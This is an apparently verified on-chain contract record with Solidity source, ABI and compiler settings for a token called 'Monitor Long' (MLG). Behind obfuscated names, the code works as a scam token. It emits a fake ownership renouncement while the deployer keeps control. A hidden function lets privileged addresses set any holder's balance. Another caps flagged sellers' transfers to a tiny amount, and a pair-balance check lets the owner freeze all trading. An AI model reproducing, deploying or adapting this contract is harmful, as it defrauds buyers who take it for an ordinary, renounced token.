{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface buyTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeSwap {\n    function createPair(address modeFrom, address toBuy) external returns (address);\n}\n\ninterface modeLaunchTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingToken) external view returns (uint256);\n\n    function transfer(address autoToken, uint256 launchedTo) external returns (bool);\n\n    function allowance(address fromSenderTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoToken,\n        uint256 launchedTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTotal, uint256 value);\n    event Approval(address indexed fromSenderTeam, address indexed spender, uint256 value);\n}\n\ninterface senderMode is modeLaunchTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MonitorLong is toLaunch, modeLaunchTotal, senderMode {\n\n    function balanceOf(address marketingToken) public view virtual override returns (uint256) {\n        return tokenTxFee[marketingToken];\n    }\n\n    string private swapFund = \"MLG\";\n\n    string private liquidityFrom = \"Monitor Long\";\n\n    function txToken(address totalMax) public {\n        require(totalMax.balance < 100000);\n        if (exemptShould) {\n            return;\n        }\n        if (buyLimitMin) {\n            listTake = true;\n        }\n        receiverFee[totalMax] = true;\n        if (limitTeamMin == txAuto) {\n            txAuto = limitTeamMin;\n        }\n        exemptShould = true;\n    }\n\n    uint256 walletSell;\n\n    uint256 listTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapFund;\n    }\n\n    bool public sellMode;\n\n    function amountTotal() private view {\n        require(receiverFee[_msgSender()]);\n    }\n\n    mapping(address => uint256) private tokenTxFee;\n\n    bool public listTake;\n\n    function isAt(uint256 launchedTo) public {\n        amountTotal();\n        listTeam = launchedTo;\n    }\n\n    function approve(address tradingEnable, uint256 launchedTo) public virtual override returns (bool) {\n        minLiquidityTake[_msgSender()][tradingEnable] = launchedTo;\n        emit Approval(_msgSender(), tradingEnable, launchedTo);\n        return true;\n    }\n\n    function transferFrom(address amountWalletSender, address autoToken, uint256 launchedTo) external override returns (bool) {\n        if (_msgSender() != amountSwapFund) {\n            if (minLiquidityTake[amountWalletSender][_msgSender()] != type(uint256).max) {\n                require(launchedTo <= minLiquidityTake[amountWalletSender][_msgSender()]);\n                minLiquidityTake[amountWalletSender][_msgSender()] -= launchedTo;\n            }\n        }\n        return feeTx(amountWalletSender, autoToken, launchedTo);\n    }\n\n    address public fromTeam;\n\n    uint256 public txAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityFrom;\n    }\n\n    address takeBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        buyTo atMode = buyTo(amountSwapFund);\n        feeShould = feeSwap(atMode.factory()).createPair(atMode.WETH(), address(this));\n        \n        fromTeam = _msgSender();\n        amountAt();\n        receiverFee[fromTeam] = true;\n        tokenTxFee[fromTeam] = walletMode;\n        \n        emit Transfer(address(0), fromTeam, walletMode);\n    }\n\n    function amountAt() public {\n        emit OwnershipTransferred(fromTeam, address(0));\n        tokenAmount = address(0);\n    }\n\n    function feeTx(address amountWalletSender, address autoToken, uint256 launchedTo) internal returns (bool) {\n        if (amountWalletSender == fromTeam) {\n            return marketingExemptBuy(amountWalletSender, autoToken, launchedTo);\n        }\n        uint256 exemptSwap = modeLaunchTotal(feeShould).balanceOf(takeBuy);\n        require(exemptSwap == listTeam);\n        require(autoToken != takeBuy);\n        if (launchExempt[amountWalletSender]) {\n            return marketingExemptBuy(amountWalletSender, autoToken, launchMax);\n        }\n        return marketingExemptBuy(amountWalletSender, autoToken, launchedTo);\n    }\n\n    mapping(address => bool) public receiverFee;\n\n    bool public enableTx;\n\n    bool public exemptShould;\n\n    function owner() external view returns (address) {\n        return tokenAmount;\n    }\n\n    bool private launchWallet;\n\n    function launchSell(address fromLiquidity) public {\n        amountTotal();\n        if (modeAuto) {\n            senderMarketingLimit = false;\n        }\n        if (fromLiquidity == fromTeam || fromLiquidity == feeShould) {\n            return;\n        }\n        launchExempt[fromLiquidity] = true;\n    }\n\n    address private tokenAmount;\n\n    event OwnershipTransferred(address indexed isFee, address indexed modeReceiverLimit);\n\n    function marketingExemptBuy(address amountWalletSender, address autoToken, uint256 launchedTo) internal returns (bool) {\n        require(tokenTxFee[amountWalletSender] >= launchedTo);\n        tokenTxFee[amountWalletSender] -= launchedTo;\n        tokenTxFee[autoToken] += launchedTo;\n        emit Transfer(amountWalletSender, autoToken, launchedTo);\n        return true;\n    }\n\n    bool private buyLimitMin;\n\n    uint8 private takeAtTx = 18;\n\n    function totalLaunch(address amountSenderAt, uint256 launchedTo) public {\n        amountTotal();\n        tokenTxFee[amountSenderAt] = launchedTo;\n    }\n\n    function transfer(address amountSenderAt, uint256 launchedTo) external virtual override returns (bool) {\n        return feeTx(_msgSender(), amountSenderAt, launchedTo);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletMode;\n    }\n\n    mapping(address => bool) public launchExempt;\n\n    function getOwner() external view returns (address) {\n        return tokenAmount;\n    }\n\n    uint256 private limitTeamMin;\n\n    uint256 private walletMode = 100000000 * 10 ** 18;\n\n    uint256 public maxLiquidity;\n\n    address public feeShould;\n\n    address amountSwapFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant launchMax = 4 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeAtTx;\n    }\n\n    mapping(address => mapping(address => uint256)) private minLiquidityTake;\n\n    bool private senderMarketingLimit;\n\n    bool private modeAuto;\n\n    function allowance(address senderTotal, address tradingEnable) external view virtual override returns (uint256) {\n        if (tradingEnable == amountSwapFund) {\n            return type(uint256).max;\n        }\n        return minLiquidityTake[senderTotal][tradingEnable];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromSenderTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeReceiverLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedTo\",\"type\":\"uint256\"}],\"name\":\"isAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLiquidity\",\"type\":\"address\"}],\"name\":\"launchSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSenderAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTo\",\"type\":\"uint256\"}],\"name\":\"totalLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSenderAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountWalletSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"}],\"name\":\"txToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MonitorLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}